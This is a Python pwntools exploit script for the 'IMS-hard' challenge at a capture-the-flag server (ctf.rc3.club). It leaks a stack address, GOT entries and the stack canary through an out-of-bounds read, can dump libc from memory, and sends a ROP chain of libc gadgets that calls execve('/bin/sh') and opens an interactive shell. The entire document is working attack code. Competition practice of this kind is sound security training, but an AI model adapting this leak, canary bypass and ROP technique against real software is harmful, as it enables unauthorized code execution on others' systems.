from pwn import *
import numpy as np
from sys import exit

def put(r, s):
    if len(s)%12:
        s += '\n'
    for j in [s[i:i+12] for i in range(0, len(s), 12)]:
        r.sendline("1")
        r.sendline(str(u32(j[-4:])))
        r.sendline(j[:-4])

def get(r, start, addr, length):
    retbuf = ""
    left = (addr - start)%12
    addr -= left
    while len(retbuf) < length+left:
        pos = (addr - start)/12
        r.sendline("3")
        r.sendline(str(pos))
        r.recvuntil("ID: ")
        code = p32(np.uint32(int(r.recvuntil(',')[:-1])))
        r.recvuntil("Code: ")
        retbuf += r.recv(8) + code
        addr += 12
    return retbuf[left:left+length]

# xxd -ps -c 256 libc.so | tr -d '\n' > hex
# find with grep -oba hexbytes hex
# even numbers only, divide by 2 to get the actual offset
gadgets = {
            "xor_eax": 384248/2,      #31c0c3
            "int80": 379356/2,        #cd80
            "inc_eax": 321974/2,      #40c3
            "pop_ebx": 213708/2,      #5bc3
            "pop_ecx_edx": 377910/2,  #595ac3
            "mov_edx_eax": 2303794/2, #89c289d0c3
          }
elfhead = "\x7fELF\x01\x01\x01"

def main():
    e = ELF("IMS-hard")
    if args['REMOTE']:
        r = remote("ctf.rc3.club", 8888)
        r.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    else:
        r = process(e.path)
        gdb.attach(r, "b print_menu")
    r.sendline("3")
    r.sendline("-4")
    r.recvuntil("ID: ")
    stack_leak = int(r.recvuntil(",")[:-1])
    log.success("leaked stack addr: " + hex(np.uint32(stack_leak)))
    bufaddr = stack_leak

    leaked_puts = u32(get(r, bufaddr, e.sym['got.puts'], 4))
    leaked_memcpy = u32(get(r, bufaddr, e.sym['got.memcpy'], 4))
    leaked_canary = u32(get(r, bufaddr, bufaddr+68, 4))

    log.success("puts: " + hex(leaked_puts))
    log.success("memcpy: " + hex(leaked_memcpy))
    log.success("canary: " + hex(leaked_canary))

    if args['GETLIBC']:
        libcbuf = ""
        cur = leaked_puts - 50
        while elfhead not in libcbuf[:55]:
            libcbuf = get(r, bufaddr, cur, 50) + libcbuf
            cur -= 50
	libcbuf = libcbuf[libcbuf.find(elfhead):]
        puts_off = len(libcbuf)
    else:
        puts_off = args.get('PUTSOFF', 0x64da0) # insert puts off found here

    libc_base = leaked_puts - puts_off
    log.success("libc base: {}, puts offset: {}".format(hex(libc_base), hex(puts_off)))

    if args['GETLIBC']:
        toget = 1736650 # make this number pretty big
        cur = leaked_puts
        while len(libcbuf) < toget:
            libcbuf += get(r, bufaddr, cur, 50)
            cur += 50

        with open("libc.so", "wb") as f:
            f.write(libcbuf)
        log.info("Got libc, exiting.")
        return

    # adjust gadgets to libc offset
    for k in gadgets.iterkeys():
        gadgets[k] += libc_base

    buf1 = str(int(u16("-c"))) + "\n" + "/bin/sh"
    buf2 = str(int(np.uint32(bufaddr))) + "\n" + p32(np.uint32(bufaddr)) + p32(np.uint32(bufaddr+8))
    buf3 = "A"*32 + p32(leaked_canary) + "B"*12
    # ebx = '/bin/sh\x00'
    buf3 += p32(gadgets["pop_ebx"]) + p32(np.uint32(bufaddr))
    # ecx = {'/bin/sh', '-c', '/bin/sh', NULL}
    buf3 += p32(gadgets['pop_ecx_edx']) + p32(np.uint32(bufaddr+12)) + "iiii"
    # edx = NULL
    buf3 += p32(gadgets['xor_eax']) + p32(gadgets['mov_edx_eax'])
    # eax = 0xb; syscall
    buf3 += p32(gadgets['inc_eax'])*0xb + p32(gadgets["int80"])*4

    log.info("Sending payload...")
    r.sendline("1")
    r.sendline(buf1)
    r.sendline("1")
    r.sendline(buf2)
    r.sendline("1\n\n")
    put(r, buf3)
    r.sendline("4")
    r.recvrepeat(1)
    r.sendline("id")
    r.interactive()

main()
